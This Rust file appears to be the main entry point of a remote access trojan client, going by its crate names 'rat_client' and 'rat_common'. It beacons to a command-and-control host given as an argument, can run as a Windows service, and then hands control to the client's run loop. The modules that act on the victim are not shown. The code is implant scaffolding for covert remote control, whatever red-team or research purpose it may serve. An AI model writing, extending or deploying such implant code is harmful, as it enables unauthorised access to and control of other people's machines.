use std::sync::Arc;

use clap::Parser;
use log::info;
use rat_client::cli::Arguments;
use rat_client::client::Client;
#[cfg(windows)]
use rat_client::service::WindowsServiceDispatcher;
use rat_common::framework::Module;
use rat_common::logger::initialize_logger;
use tokio::signal;

async fn beacon(host: String) -> Option<Arc<Client>> {
    tokio::select! {
        client = Client::connect(host) => {
            Some(Arc::new(client))
        }
        _ = signal::ctrl_c() => {
            info!("Received Ctrl-C signal during beaconing.");
            None
        }
    }
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let arguments = Arguments::parse();
    initialize_logger(arguments.log_level, &arguments.log_path)?;

    #[cfg(windows)]
    let scm_thread = if arguments.scm {
        Some(WindowsServiceDispatcher::start())
    } else {
        None
    };

    info!("Starting client: {arguments:?}");
    let client = match beacon(arguments.host).await {
        Some(c) => c,
        None => {
            return Ok(());
        }
    };

    let client_c = client.clone();
    tokio::spawn(async move {
        info!("Registered Ctrl-C handler.");
        let _ = signal::ctrl_c().await;
        info!("Received Ctrl-C signal.");
        client_c.stop();
    });

    client.run().await?;

    #[cfg(windows)]
    if let Some(scm) = scm_thread {
        scm.stop().await;
    }

    Ok(())
}
